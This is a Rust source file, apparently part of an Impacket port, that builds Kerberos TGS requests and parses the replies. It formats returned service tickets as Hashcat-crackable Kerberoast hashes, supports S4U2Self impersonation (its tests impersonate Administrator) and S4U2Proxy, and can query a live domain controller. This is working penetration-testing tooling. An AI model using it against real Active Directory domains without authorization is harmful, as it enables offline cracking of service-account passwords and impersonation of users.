//! RFC 4120 `TGS-REQ` / `TGS-REP` exchange engine and Kerberoast ticket formatter.
//!
//! Provides ticket-granting service requests against Active Directory KDCs (TCP/88)
//! and generates Hashcat-formatted hashes (modes 13100, 19600, 19700) from the returned
//! service tickets (`examples/GetUserSPNs.py`).

use std::io::{Read, Write};
use std::net::{SocketAddr, TcpStream, ToSocketAddrs};
use std::time::Duration;

use impacket_core::{encode_hex, CoreError};

use crate::ccache::{CCache, Credential, KeyBlock, Principal, Times};
use crate::crypto::{rc4_hmac_encrypt, unix_to_kerberos_time};
use crate::der;
use crate::{KerberosEType, KrbErrorCode};

/// RFC 4120 `TGS-REQ` (Application 12) builder for service ticket requests.
#[derive(Debug, Clone)]
pub struct Krb5TgsReq {
    pub realm: String,
    pub spn_components: Vec<String>,
    pub user_realm: String,
    pub username: String,
    pub tgt_ticket: Vec<u8>,
    pub session_key: Vec<u8>,
    pub session_key_etype: i32,
    pub requested_etypes: Vec<KerberosEType>,
    pub nonce: u32,
    pub s4u2self_user: Option<String>,
    pub additional_tickets: Vec<Vec<u8>>,
    /// RFC 4120 §3.7 Kerberos User-to-User (U2U) flag (`ENC-TICKET-IN-SKEY`).
    pub u2u: bool,
}

impl Krb5TgsReq {
    pub fn new(
        realm: impl Into<String>,
        username: impl Into<String>,
        spn: &str,
        tgt_ticket: &[u8],
        session_key: &[u8],
        session_key_etype: i32,
        requested_etypes: &[KerberosEType],
    ) -> Self {
        let realm_str = realm.into().to_uppercase();
        let user_str = username.into();

        let spn_components: Vec<String> = if spn.contains('/') {
            spn.splitn(2, '/').map(|s| s.to_string()).collect()
        } else {
            vec![spn.to_string()]
        };

        Self {
            realm: realm_str.clone(),
            spn_components,
            user_realm: realm_str,
            username: user_str,
            tgt_ticket: tgt_ticket.to_vec(),
            session_key: session_key.to_vec(),
            session_key_etype,
            requested_etypes: requested_etypes.to_vec(),
            nonce: 0x2A4C_6E80,
            s4u2self_user: None,
            additional_tickets: Vec::new(),
            u2u: false,
        }
    }

    /// Configures User-to-User (U2U) authentication per RFC 4120 §3.7.
    /// Attaches the server's TGT into `additional_tickets` and sets `enc-tkt-in-skey`.
    pub fn with_u2u(&mut self, server_tgt_ticket: Vec<u8>) -> &mut Self {
        self.u2u = true;
        self.additional_tickets = vec![server_tgt_ticket];
        self
    }

    /// Serializes the `TGS-REQ` into ASN.1 DER with an optional 4-byte TCP framing prefix.
    pub fn to_der_bytes(&self, now_unix: i64, with_tcp_prefix: bool) -> Result<Vec<u8>, CoreError> {
        let ts = unix_to_kerberos_time(now_unix);

        // Authenticator ::= [APPLICATION 2] SEQUENCE
        let cname = der::encode_sequence(&[
            der::encode_context_explicit(0, &der::encode_integer(1)),
            der::encode_context_explicit(
                1,
                &der::encode_sequence(&[der::encode_general_string(&self.username)]),
            ),
        ]);

        let auth_seq = der::encode_sequence(&[
            der::encode_context_explicit(0, &der::encode_integer(5)),
            der::encode_context_explicit(1, &der::encode_general_string(&self.user_realm)),
            der::encode_context_explicit(2, &cname),
            der::encode_context_explicit(4, &der::encode_integer(0)),
            der::encode_context_explicit(5, &der::encode_generalized_time(&ts)),
        ]);
        let authenticator_der = der::encode_application(2, &auth_seq);

        // Encrypt Authenticator with Key Usage 7 (KRB_KEY_USAGE_TGS_REQ_PA_TGS_REQ_AP_REQ_AUTHENTICATOR)
        let enc_authenticator = if self.session_key_etype == 23 {
            let key16: [u8; 16] = self.session_key.as_slice().try_into().map_err(|_| {
                CoreError::ProtocolError("RC4 session key must be exactly 16 bytes".into())
            })?;
            let mut confounder = [0u8; 8];
            for (i, b) in ts.as_bytes().iter().take(8).enumerate() {
                confounder[i] = *b;
            }
            let cipher = rc4_hmac_encrypt(&key16, 7, &authenticator_der, &confounder);
            der::encode_sequence(&[
                der::encode_context_explicit(0, &der::encode_integer(23)),
                der::encode_context_explicit(2, &der::encode_octet_string(&cipher)),
            ])
        } else if self.session_key_etype == 17 {
            let key16: [u8; 16] = self.session_key.as_slice().try_into().map_err(|_| {
                CoreError::ProtocolError("AES-128 session key must be exactly 16 bytes".into())
            })?;
            let conf16 = [0x54; 16];
            let cipher = crate::crypto::aes128_cts_hmac_sha1_96_encrypt(&key16, 7, &authenticator_der, &conf16)?;
            der::encode_sequence(&[
                der::encode_context_explicit(0, &der::encode_integer(17)),
                der::encode_context_explicit(2, &der::encode_octet_string(&cipher)),
            ])
        } else if self.session_key_etype == 18 {
            let key32: [u8; 32] = self.session_key.as_slice().try_into().map_err(|_| {
                CoreError::ProtocolError("AES-256 session key must be exactly 32 bytes".into())
            })?;
            let conf16 = [0x54; 16];
            let cipher = crate::crypto::aes256_cts_hmac_sha1_96_encrypt(&key32, 7, &authenticator_der, &conf16)?;
            der::encode_sequence(&[
                der::encode_context_explicit(0, &der::encode_integer(18)),
                der::encode_context_explicit(2, &der::encode_octet_string(&cipher)),
            ])
        } else {
            return Err(CoreError::ProtocolError(format!(
                "unsupported TGS session key etype: {}",
                self.session_key_etype
            )));
        };

        // AP-REQ ::= [APPLICATION 14] SEQUENCE
        let ap_options = der::encode_bit_string_u32(0);
        let ap_req_seq = der::encode_sequence(&[
            der::encode_context_explicit(0, &der::encode_integer(5)),
            der::encode_context_explicit(1, &der::encode_integer(14)),
            der::encode_context_explicit(2, &ap_options),
            der::encode_context_explicit(3, &self.tgt_ticket),
            der::encode_context_explicit(4, &enc_authenticator),
        ]);
        let ap_req_der = der::encode_application(14, &ap_req_seq);

        // PA-DATA ::= SEQUENCE { [1] padata-type (1), [2] padata-value (ap_req_der) }
        let padata_tgs = der::encode_sequence(&[
            der::encode_context_explicit(1, &der::encode_integer(1)),
            der::encode_context_explicit(2, &der::encode_octet_string(&ap_req_der)),
        ]);
        let mut padata_elements = vec![padata_tgs];

        // PA-FOR-USER (129) for S4U2Self
        if let Some(ref impersonate_user) = self.s4u2self_user {
            let user_cname = der::encode_sequence(&[
                der::encode_context_explicit(0, &der::encode_integer(1)),
                der::encode_context_explicit(
                    1,
                    &der::encode_sequence(&[der::encode_general_string(impersonate_user)]),
                ),
            ]);
            let user_realm = der::encode_general_string(&self.user_realm);
            let auth_pkg = der::encode_general_string("Kerberos");

            let cksum_data = [impersonate_user.as_bytes(), self.user_realm.as_bytes()].concat();
            let (cksum_type, cksum_val) = if self.session_key_etype == 23 {
                let k16: [u8; 16] = self.session_key.as_slice().try_into().unwrap_or([0u8; 16]);
                (17i32, impacket_crypto::hmac_md5(&k16, &cksum_data).to_vec())
            } else {
                let k16: [u8; 16] = self.session_key.as_slice().try_into().unwrap_or([0u8; 16]);
                (15i32, impacket_crypto::hmac_sha1_96(&k16, &cksum_data).to_vec())
            };

            let cksum_seq = der::encode_sequence(&[
                der::encode_context_explicit(0, &der::encode_integer(cksum_type as i64)),
                der::encode_context_explicit(1, &der::encode_octet_string(&cksum_val)),
            ]);

            let pa_for_user_seq = der::encode_sequence(&[
                der::encode_context_explicit(0, &user_cname),
                der::encode_context_explicit(1, &user_realm),
                der::encode_context_explicit(2, &cksum_seq),
                der::encode_context_explicit(3, &auth_pkg),
            ]);

            let padata_s4u = der::encode_sequence(&[
                der::encode_context_explicit(1, &der::encode_integer(129)),
                der::encode_context_explicit(2, &der::encode_octet_string(&pa_for_user_seq)),
            ]);
            padata_elements.push(padata_s4u);
        }
        let padata_seq = der::encode_sequence(&padata_elements);

        // KDC-REQ-BODY
        let mut kdc_options_val = 0x4081_0010u32; // forwardable, renewable, renewable_ok, canonicalize
        if self.u2u {
            kdc_options_val |= 0x0000_0008; // enc-tkt-in-skey (RFC 4120 §3.7 U2U)
        } else if !self.additional_tickets.is_empty() {
            kdc_options_val |= 0x0002_0000; // cname-in-addl-tkt (S4U2Proxy)
        }
        let kdc_options = der::encode_bit_string_u32(kdc_options_val);
        let sname_components: Vec<Vec<u8>> = self
            .spn_components
            .iter()
            .map(|s| der::encode_general_string(s))
            .collect();
        let sname = der::encode_sequence(&[
            der::encode_context_explicit(0, &der::encode_integer(2)), // NT-SRV-INST
            der::encode_context_explicit(1, &der::encode_sequence(&sname_components)),
        ]);
        let realm = der::encode_general_string(&self.realm);
        let till = der::encode_generalized_time("20370913024805Z");
        let nonce = der::encode_integer(self.nonce as i64);

        let etype_els: Vec<Vec<u8>> = self
            .requested_etypes
            .iter()
            .map(|&e| der::encode_integer(e as i64))
            .collect();
        let etype_seq = der::encode_sequence(&etype_els);

        let mut req_body_elements = vec![
            der::encode_context_explicit(0, &kdc_options),
            der::encode_context_explicit(2, &sname),
            der::encode_context_explicit(3, &realm),
            der::encode_context_explicit(5, &till),
            der::encode_context_explicit(7, &nonce),
            der::encode_context_explicit(8, &etype_seq),
        ];

        if !self.additional_tickets.is_empty() {
            let mut addl_seq = Vec::new();
            for t in &self.additional_tickets {
                addl_seq.push(t.clone());
            }
            req_body_elements.push(der::encode_context_explicit(11, &der::encode_sequence(&addl_seq)));
        }

        let req_body = der::encode_sequence(&req_body_elements);

        let kdc_req = der::encode_sequence(&[
            der::encode_context_explicit(1, &der::encode_integer(5)),
            der::encode_context_explicit(2, &der::encode_integer(12)), // TGS-REQ
            der::encode_context_explicit(3, &padata_seq),
            der::encode_context_explicit(4, &req_body),
        ]);

        let app12 = der::encode_application(12, &kdc_req);
        if with_tcp_prefix {
            let mut out = Vec::with_capacity(4 + app12.len());
            out.extend_from_slice(&(app12.len() as u32).to_be_bytes());
            out.extend_from_slice(&app12);
            Ok(out)
        } else {
            Ok(app12)
        }
    }
}

/// Parsed response from a KDC to a `TGS-REQ`.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Krb5TgsRep {
    pub realm: String,
    pub ticket_sname: Vec<String>,
    pub ticket_realm: String,
    pub ticket_raw: Vec<u8>,
    pub ticket_enc_etype: i32,
    pub ticket_enc_cipher: Vec<u8>,
    pub ticket_kvno: Option<u32>,
    pub rep_enc_etype: i32,
    pub rep_enc_cipher: Vec<u8>,
}

impl Krb5TgsRep {
    /// Parses an ASN.1 DER `TGS-REP` (`[APPLICATION 13]`) or `KRB-ERROR` (`[APPLICATION 30]`).
    pub fn from_der_bytes(data: &[u8]) -> Result<Self, CoreError> {
        let (app_tag, app_body, _) = der::decode_tlv(data)?;
        let (_, mut seq_body, _) = der::decode_tlv(app_body)?;

        if app_tag == 0x7E {
            // KRB-ERROR (Application 30)
            let mut err_code = 0u32;
            while !seq_body.is_empty() {
                let (ctx_tag, ctx_val, rest) = der::decode_tlv(seq_body)?;
                seq_body = rest;
                if (ctx_tag & 0x1F) == 6 {
                    err_code = der::decode_integer(ctx_val)? as u32;
                }
            }
            let err = KrbErrorCode(err_code);
            return Err(CoreError::ProtocolError(format!(
                "KDC returned error: 0x{:X} ({})",
                err.0,
                err.name()
            )));
        } else if app_tag != 0x6D {
            return Err(CoreError::ProtocolError(format!(
                "Unexpected Kerberos application tag 0x{:02X}, expected 0x6D (TGS-REP)",
                app_tag
            )));
        }

        let mut rep_realm = String::new();
        let mut ticket_raw = Vec::new();
        let mut ticket_realm = String::new();
        let mut ticket_sname = Vec::new();
        let mut ticket_enc_etype = 23i32;
        let mut ticket_enc_cipher = Vec::new();
        let mut ticket_kvno = None;
        let mut rep_enc_etype = 23i32;
        let mut rep_enc_cipher = Vec::new();

        while !seq_body.is_empty() {
            let (ctx_tag, ctx_val, rest) = der::decode_tlv(seq_body)?;
            seq_body = rest;
            match ctx_tag & 0x1F {
                3 => {
                    let (_, r_bytes, _) = der::decode_tlv(ctx_val)?;
                    rep_realm = String::from_utf8_lossy(r_bytes).into_owned();
                }
                5 => {
                    // ticket [5] Ticket ([APPLICATION 1])
                    ticket_raw = ctx_val.to_vec();
                    let (tkt_app, tkt_seq_body, _) = der::decode_tlv(ctx_val)?;
                    if tkt_app == 0x61 {
                        let (_, mut tkt_body, _) = der::decode_tlv(tkt_seq_body)?;
                        while !tkt_body.is_empty() {
                            let (t_tag, t_val, t_rest) = der::decode_tlv(tkt_body)?;
                            tkt_body = t_rest;
                            match t_tag & 0x1F {
                                1 => {
                                    let (_, r_b, _) = der::decode_tlv(t_val)?;
                                    ticket_realm = String::from_utf8_lossy(r_b).into_owned();
                                }
                                2 => {
                                    // sname [2] PrincipalName
                                    let (_, sname_seq, _) = der::decode_tlv(t_val)?;
                                    let mut sn_rem = sname_seq;
                                    while !sn_rem.is_empty() {
                                        let (sn_tag, sn_val, sn_rest) = der::decode_tlv(sn_rem)?;
                                        sn_rem = sn_rest;
                                        if (sn_tag & 0x1F) == 1 {
                                            // name-string [1] SEQUENCE OF GeneralString
                                            let (_, comp_seq, _) = der::decode_tlv(sn_val)?;
                                            let mut comp_rem = comp_seq;
                                            while !comp_rem.is_empty() {
                                                let (_, c_bytes, c_rest) = der::decode_tlv(comp_rem)?;
                                                comp_rem = c_rest;
                                                ticket_sname.push(String::from_utf8_lossy(c_bytes).into_owned());
                                            }
                                        }
                                    }
                                }
                                3 => {
                                    // enc-part [3] EncryptedData
                                    let (_, enc_seq, _) = der::decode_tlv(t_val)?;
                                    let mut enc_rem = enc_seq;
                                    while !enc_rem.is_empty() {
                                        let (e_tag, e_val, e_rest) = der::decode_tlv(enc_rem)?;
                                        enc_rem = e_rest;
                                        match e_tag & 0x1F {
                                            0 => ticket_enc_etype = der::decode_integer(e_val)? as i32,
                                            1 => ticket_kvno = Some(der::decode_integer(e_val)? as u32),
                                            2 => {
                                                let (_, c_b, _) = der::decode_tlv(e_val)?;
                                                ticket_enc_cipher = c_b.to_vec();
                                            }
                                            _ => {}
                                        }
                                    }
                                }
                                _ => {}
                            }
                        }
                    }
                }
                6 => {
                    // enc-part [6] EncryptedData (EncKDCRepPart)
                    let (_, enc_seq, _) = der::decode_tlv(ctx_val)?;
                    let mut enc_rem = enc_seq;
                    while !enc_rem.is_empty() {
                        let (e_tag, e_val, e_rest) = der::decode_tlv(enc_rem)?;
                        enc_rem = e_rest;
                        match e_tag & 0x1F {
                            0 => rep_enc_etype = der::decode_integer(e_val)? as i32,
                            2 => {
                                let (_, c_b, _) = der::decode_tlv(e_val)?;
                                rep_enc_cipher = c_b.to_vec();
                            }
                            _ => {}
                        }
                    }
                }
                _ => {}
            }
        }

        Ok(Self {
            realm: rep_realm,
            ticket_sname,
            ticket_realm,
            ticket_raw,
            ticket_enc_etype,
            ticket_enc_cipher,
            ticket_kvno,
            rep_enc_etype,
            rep_enc_cipher,
        })
    }

    /// Formats the Kerberos service ticket as a Hashcat Kerberoast crackable string.
    ///
    /// - Mode 13100 (RC4-HMAC): `$krb5tgs$23$*{username}${realm}${spn}*${checksum}${cipher}`
    /// - Mode 19600 (AES-128): `$krb5tgs$17${username}${realm}$*${spn}*${checksum}${cipher}`
    /// - Mode 19700 (AES-256): `$krb5tgs$18${username}${realm}$*${spn}*${checksum}${cipher}`
    pub fn to_hashcat_format(&self, username: &str, spn: &str) -> Option<String> {
        let spn_tilde = spn.replace(':', "~");
        let realm = if !self.ticket_realm.is_empty() {
            &self.ticket_realm
        } else {
            &self.realm
        };

        match self.ticket_enc_etype {
            23 => {
                // RC4-HMAC: first 16 bytes are checksum, rest is cipher
                if self.ticket_enc_cipher.len() < 16 {
                    return None;
                }
                let checksum = encode_hex(&self.ticket_enc_cipher[..16]);
                let data = encode_hex(&self.ticket_enc_cipher[16..]);
                Some(format!(
                    "$krb5tgs$23$*{}${}${}*${}${}",
                    username, realm, spn_tilde, checksum, data
                ))
            }
            17 | 18 => {
                // AES128 / AES256: last 12 bytes are checksum, preceding is cipher
                if self.ticket_enc_cipher.len() < 12 {
                    return None;
                }
                let split = self.ticket_enc_cipher.len() - 12;
                let data = encode_hex(&self.ticket_enc_cipher[..split]);
                let checksum = encode_hex(&self.ticket_enc_cipher[split..]);
                Some(format!(
                    "$krb5tgs${}${}${}$*{}*${}${}",
                    self.ticket_enc_etype, username, realm, spn_tilde, checksum, data
                ))
            }
            _ => None,
        }
    }

    /// Decrypts the TGS-REP `enc-part` using the TGT session key and returns the Service Ticket's `(etype, session_key)`.
    pub fn decrypt_session_key(
        &self,
        tgt_session_key: &[u8],
        tgt_etype: i32,
    ) -> Result<(i32, Vec<u8>), CoreError> {
        let pt = match tgt_etype {
            23 => {
                let k16: [u8; 16] = tgt_session_key.try_into().map_err(|_| {
                    CoreError::ProtocolError("RC4 key must be 16 bytes".into())
                })?;
                crate::crypto::rc4_hmac_decrypt(&k16, 8, &self.rep_enc_cipher)?
            }
            17 => {
                let k16: [u8; 16] = tgt_session_key.try_into().map_err(|_| {
                    CoreError::ProtocolError("AES-128 key must be 16 bytes".into())
                })?;
                crate::crypto::aes128_cts_hmac_sha1_96_decrypt(&k16, 8, &self.rep_enc_cipher)?
            }
            18 => {
                let k32: [u8; 32] = tgt_session_key.try_into().map_err(|_| {
                    CoreError::ProtocolError("AES-256 key must be 32 bytes".into())
                })?;
                crate::crypto::aes256_cts_hmac_sha1_96_decrypt(&k32, 8, &self.rep_enc_cipher)?
            }
            other => {
                return Err(CoreError::ProtocolError(format!(
                    "Unsupported TGS key etype {}",
                    other
                )));
            }
        };

        // Parse EncKDCRepPart ([APPLICATION 26])
        let (app_tag, app_body, _) = der::decode_tlv(&pt)?;
        let enc_body = if app_tag == 0x7A {
            let (_, body, _) = der::decode_tlv(app_body)?;
            body
        } else {
            app_body
        };

        let mut key_type = 23i32;
        let mut key_value = Vec::new();

        let mut rem = enc_body;
        while !rem.is_empty() {
            let (tag, val, next) = der::decode_tlv(rem)?;
            rem = next;
            if (tag & 0x1F) == 0 {
                // key [0] EncryptionKey
                let (_, k_seq, _) = der::decode_tlv(val)?;
                let mut k_rem = k_seq;
                while !k_rem.is_empty() {
                    let (ktag, kval, knext) = der::decode_tlv(k_rem)?;
                    k_rem = knext;
                    if (ktag & 0x1F) == 0 {
                        key_type = der::decode_integer(kval)? as i32;
                    } else if (ktag & 0x1F) == 1 {
                        let (_, octets, _) = der::decode_tlv(kval)?;
                        key_value = octets.to_vec();
                    }
                }
            }
        }

        if key_value.is_empty() {
            return Err(CoreError::ProtocolError(
                "No session key found in TGS-REP".into(),
            ));
        }

        Ok((key_type, key_value))
    }

    /// Converts this ticket into a `.ccache` container with a single service ticket.
    pub fn to_ccache(
        &self,
        client_realm: &str,
        client_username: &str,
        session_key: &[u8],
        session_key_etype: u16,
    ) -> CCache {
        let client = Principal::new(client_realm, &[client_username]);
        let server_components: Vec<&str> = self.ticket_sname.iter().map(|s| s.as_str()).collect();
        let server = Principal::new(&self.ticket_realm, &server_components);

        let cred = Credential {
            client: client.clone(),
            server,
            key: KeyBlock {
                keytype: session_key_etype,
                keyvalue: session_key.to_vec(),
            },
            times: Times {
                authtime: 0,
                starttime: 0,
                endtime: 0,
                renew_till: 0,
            },
            is_skey: 0,
            ticket_flags: 0x4081_0010,
            ticket: self.ticket_raw.clone(),
            second_ticket: Vec::new(),
        };

        let mut ccache = CCache::new(client);
        ccache.credentials.push(cred);
        ccache
    }
}

/// Sans-I/O `get_tgs`: sends length-prefixed `TGS-REQ` over `tx` and parses `TGS-REP` from `rx`.
pub fn get_tgs_over_stream<R: Read, W: Write>(
    tgs_req: &Krb5TgsReq,
    now_unix: i64,
    rx: &mut R,
    tx: &mut W,
) -> Result<Krb5TgsRep, CoreError> {
    let req_bytes = tgs_req.to_der_bytes(now_unix, true)?;
    tx.write_all(&req_bytes)
        .map_err(|e| CoreError::ProtocolError(format!("Failed sending TGS-REQ: {}", e)))?;

    let mut len_buf = [0u8; 4];
    rx.read_exact(&mut len_buf)
        .map_err(|e| CoreError::ProtocolError(format!("Failed reading KDC TCP length prefix: {}", e)))?;
    let msg_len = u32::from_be_bytes(len_buf) as usize;
    if msg_len > 4 * 1024 * 1024 {
        return Err(CoreError::ProtocolError("Oversized Kerberos TCP reply".into()));
    }
    let mut der_buf = vec![0u8; msg_len];
    rx.read_exact(&mut der_buf)
        .map_err(|e| CoreError::ProtocolError(format!("Failed reading KDC reply body: {}", e)))?;

    Krb5TgsRep::from_der_bytes(&der_buf)
}

/// Decrypts the `enc-part` of an RC4-HMAC `AS-REP` using the account's NT hash
/// and extracts the TGS session key (`(keytype, keyvalue)`).
pub fn extract_session_key_from_as_rep(
    as_rep_cipher: &[u8],
    nt_hash: &[u8; 16],
) -> Result<(i32, Vec<u8>), CoreError> {
    use crate::crypto::rc4_hmac_decrypt;

    let plain = rc4_hmac_decrypt(nt_hash, 3, as_rep_cipher)?;
    let (_, app_body, _) = der::decode_tlv(&plain)?;
    let (_, seq_body, _) = der::decode_tlv(app_body)?;

    let mut rem = seq_body;
    while !rem.is_empty() {
        let (tag, val, next) = der::decode_tlv(rem)?;
        rem = next;
        if (tag & 0x1F) == 0 {
            // key [0] EncryptionKey
            let (_, key_seq, _) = der::decode_tlv(val)?;
            let mut key_rem = key_seq;
            let mut keytype = 23i32;
            let mut keyvalue = Vec::new();
            while !key_rem.is_empty() {
                let (k_tag, k_val, k_next) = der::decode_tlv(key_rem)?;
                key_rem = k_next;
                match k_tag & 0x1F {
                    0 => keytype = der::decode_integer(k_val)? as i32,
                    1 => {
                        let (_, v_bytes, _) = der::decode_tlv(k_val)?;
                        keyvalue = v_bytes.to_vec();
                    }
                    _ => {}
                }
            }
            if !keyvalue.is_empty() {
                return Ok((keytype, keyvalue));
            }
        }
    }

    Err(CoreError::ProtocolError(
        "failed to extract session key from decrypted AS-REP".into(),
    ))
}

/// Connects to a live Active Directory KDC (TCP/88) and requests a service ticket.
pub fn get_tgs_live(
    kdc_host: &str,
    kdc_port: u16,
    tgs_req: &Krb5TgsReq,
    now_unix: i64,
    timeout: Duration,
) -> Result<Krb5TgsRep, CoreError> {
    let addr_str = format!("{}:{}", kdc_host, kdc_port);
    let sock_addr: SocketAddr = addr_str
        .to_socket_addrs()
        .map_err(|e| CoreError::ProtocolError(format!("Failed resolving KDC {}: {}", addr_str, e)))?
        .next()
        .ok_or_else(|| CoreError::ProtocolError(format!("No address found for KDC {}", addr_str)))?;

    let stream = TcpStream::connect_timeout(&sock_addr, timeout)
        .map_err(|e| CoreError::ProtocolError(format!("TCP connect to KDC {} failed: {}", addr_str, e)))?;
    let _ = stream.set_read_timeout(Some(timeout));
    let _ = stream.set_write_timeout(Some(timeout));

    let mut rx = stream
        .try_clone()
        .map_err(|e| CoreError::ProtocolError(format!("Socket clone failed: {}", e)))?;
    let mut tx = stream;
    get_tgs_over_stream(tgs_req, now_unix, &mut rx, &mut tx)
}

/// Decrypts a User-to-User (U2U) service ticket's `enc-part` using the server's TGT session key per RFC 4120 §3.7.
pub fn decrypt_u2u_ticket_enc_part(
    ticket_der: &[u8],
    server_tgt_session_key: &[u8],
    etype: i32,
) -> Result<Vec<u8>, CoreError> {
    let (t_etype, _kvno, cipher) = crate::pac::parse_ticket_enc_part(ticket_der)?;
    let effective_etype = if etype != 0 { etype } else { t_etype };
    if effective_etype == 18 {
        let key32: [u8; 32] = server_tgt_session_key.try_into().map_err(|_| {
            CoreError::ProtocolError("AES-256 session key must be 32 bytes".into())
        })?;
        crate::crypto::aes256_cts_hmac_sha1_96_decrypt(&key32, 2, &cipher)
    } else if effective_etype == 17 {
        let key16: [u8; 16] = server_tgt_session_key.try_into().map_err(|_| {
            CoreError::ProtocolError("AES-128 session key must be 16 bytes".into())
        })?;
        crate::crypto::aes128_cts_hmac_sha1_96_decrypt(&key16, 2, &cipher)
    } else if effective_etype == 23 {
        let key16: [u8; 16] = server_tgt_session_key.try_into().map_err(|_| {
            CoreError::ProtocolError("RC4 session key must be 16 bytes".into())
        })?;
        crate::crypto::rc4_hmac_decrypt(&key16, 2, &cipher)
    } else {
        Err(CoreError::ProtocolError(format!(
            "Unsupported U2U ticket encryption type: {}",
            effective_etype
        )))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_tgs_req_builder_and_hashcat_format() {
        let tgt_ticket = vec![0x61, 0x05, 0x30, 0x03, 0x02, 0x01, 0x05];
        let session_key = [0x55u8; 16];
        let req = Krb5TgsReq::new(
            "CORP.LOCAL",
            "jdoe",
            "MSSQLSvc/sql01.corp.local:1433",
            &tgt_ticket,
            &session_key,
            23,
            &[KerberosEType::Rc4Hmac],
        );

        let der = req.to_der_bytes(1700000000, true).unwrap();
        assert!(der.len() > 20);
        let msg_len = u32::from_be_bytes(der[0..4].try_into().unwrap()) as usize;
        assert_eq!(msg_len, der.len() - 4);
        assert_eq!(der[4], 0x6C); // Application 12

        // Build a mock TGS-REP
        let mock_checksum = [0x11u8; 16];
        let mock_cipher = [0x22u8; 32];
        let mut full_cipher = Vec::new();
        full_cipher.extend_from_slice(&mock_checksum);
        full_cipher.extend_from_slice(&mock_cipher);

        let rep = Krb5TgsRep {
            realm: "CORP.LOCAL".into(),
            ticket_sname: vec!["MSSQLSvc".into(), "sql01.corp.local:1433".into()],
            ticket_realm: "CORP.LOCAL".into(),
            ticket_raw: vec![0x61, 0x10],
            ticket_enc_etype: 23,
            ticket_enc_cipher: full_cipher,
            ticket_kvno: Some(2),
            rep_enc_etype: 23,
            rep_enc_cipher: Vec::new(),
        };

        let hashcat = rep.to_hashcat_format("sql_svc", "MSSQLSvc/sql01.corp.local:1433").unwrap();
        assert!(hashcat.starts_with("$krb5tgs$23$*sql_svc$CORP.LOCAL$MSSQLSvc/sql01.corp.local~1433*"));
        assert!(hashcat.contains(&encode_hex(&mock_checksum)));
        assert!(hashcat.contains(&encode_hex(&mock_cipher)));
    }

    #[test]
    fn test_extract_session_key_from_as_rep() {
        let nt_hash = [0x44u8; 16];
        let session_key = [0x77u8; 16];

        // Build EncASRepPart ::= [APPLICATION 25] SEQUENCE { [0] key SEQUENCE { [0] 23, [1] session_key } }
        let key_seq = der::encode_sequence(&[
            der::encode_context_explicit(0, &der::encode_integer(23)),
            der::encode_context_explicit(1, &der::encode_octet_string(&session_key)),
        ]);
        let rep_part = der::encode_sequence(&[der::encode_context_explicit(0, &key_seq)]);
        let app25 = der::encode_application(25, &rep_part);

        let confounder = [0x33u8; 8];
        let cipher = rc4_hmac_encrypt(&nt_hash, 3, &app25, &confounder);

        let (etype, extracted_key) = extract_session_key_from_as_rep(&cipher, &nt_hash).unwrap();
        assert_eq!(etype, 23);
        assert_eq!(extracted_key, session_key);
    }

    #[test]
    fn test_s4u2self_and_s4u2proxy_tgs_req() {
        let tgt_ticket = vec![0x61, 0x05, 0x30, 0x03, 0x02, 0x01, 0x05];
        let session_key = [0x55u8; 16];
        let mut req = Krb5TgsReq::new(
            "CORP.LOCAL",
            "websvc",
            "HOST/web01.corp.local",
            &tgt_ticket,
            &session_key,
            23,
            &[KerberosEType::Rc4Hmac],
        );
        req.s4u2self_user = Some("Administrator".to_string());

        let der = req.to_der_bytes(1700000000, true).unwrap();
        assert!(der.len() > 30);

        // S4U2Proxy request with additional tickets
        req.s4u2self_user = None;
        req.additional_tickets = vec![tgt_ticket.clone()];
        let proxy_der = req.to_der_bytes(1700000000, true).unwrap();
        assert!(proxy_der.len() > 30);
    }

    #[test]
    fn test_u2u_tgs_req_and_ticket_decryption() {
        let tgt_ticket = vec![0x61, 0x05, 0x30, 0x03, 0x02, 0x01, 0x05];
        let session_key = [0x55u8; 16];
        let server_tgt = vec![0x61, 0x07, 0x30, 0x05, 0x02, 0x01, 0x05, 0x00, 0x00];
        let mut req = Krb5TgsReq::new(
            "CORP.LOCAL",
            "client_user",
            "server_user",
            &tgt_ticket,
            &session_key,
            23,
            &[KerberosEType::Rc4Hmac],
        );
        req.with_u2u(server_tgt.clone());
        assert!(req.u2u);
        assert_eq!(req.additional_tickets.len(), 1);

        let u2u_der = req.to_der_bytes(1700000000, true).unwrap();
        assert!(u2u_der.len() > 40);

        // Test decrypting a synthetic U2U ticket encrypted with server's TGT session key
        let server_tgt_session_key = [0x78u8; 16];
        let plain_enc_part = b"Synthetic EncTicketPart for U2U";
        let conf8 = [0x11u8; 8];
        let cipher = rc4_hmac_encrypt(&server_tgt_session_key, 2, plain_enc_part, &conf8);

        let enc_data = der::encode_sequence(&[
            der::encode_context_explicit(0, &der::encode_integer(23)),
            der::encode_context_explicit(2, &der::encode_octet_string(&cipher)),
        ]);
        let ticket_seq = der::encode_sequence(&[
            der::encode_context_explicit(0, &der::encode_integer(5)),
            der::encode_context_explicit(1, &der::encode_general_string("CORP.LOCAL")),
            der::encode_context_explicit(3, &enc_data),
        ]);
        let ticket_app1 = der::encode_application(1, &ticket_seq);

        let decrypted = decrypt_u2u_ticket_enc_part(&ticket_app1, &server_tgt_session_key, 23)
            .expect("Decryption of U2U ticket failed");
        assert_eq!(decrypted, plain_enc_part);
    }
}
